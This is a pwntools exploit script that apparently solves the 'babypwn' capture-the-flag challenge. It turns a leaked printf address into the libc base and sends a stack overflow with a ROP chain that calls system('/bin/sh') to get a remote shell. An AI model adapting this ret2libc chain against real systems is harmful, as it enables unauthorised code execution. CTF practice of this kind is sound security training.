#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["tmux", "split", "-h"]

exe = 'babypwn'
host = args.HOST or 'babypwn.pwn.midnightflag.fr'
port = int(args.PORT or 16000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug("babypwn", gdbscript=gdbscript)
    else:
        return process("babypwn")

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

context.binary = elf = ELF("babypwn")
rop = ROP(elf)

libc = ELF("libc.so.6")
#env = {"LD_PRELOAD": libc} if libc else {}
rop_libc = ROP(libc)

io = start()
data = io.recvuntil(b'There you go, libc leak: ')
printf_addr = int(io.recv().decode(), 16)

libc.address = printf_addr - libc.symbols['printf']
system_base_addr = libc.symbols['system']
sh_base_addr = next(libc.search(b"/bin/sh\x00"))
pop_rdi_addr = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
ret_addr = rop_libc.find_gadget(['ret'])[0]

print(hex(pop_rdi_addr + libc.address))
print(hex(sh_base_addr))
print(hex(system_base_addr))
io.sendline(b"A"*(0x48) + p64(pop_rdi_addr + libc.address) + p64(sh_base_addr) + p64(ret_addr + libc.address) + p64(system_base_addr)) # SUB RBP, 0x40 + RBP
io.interactive()
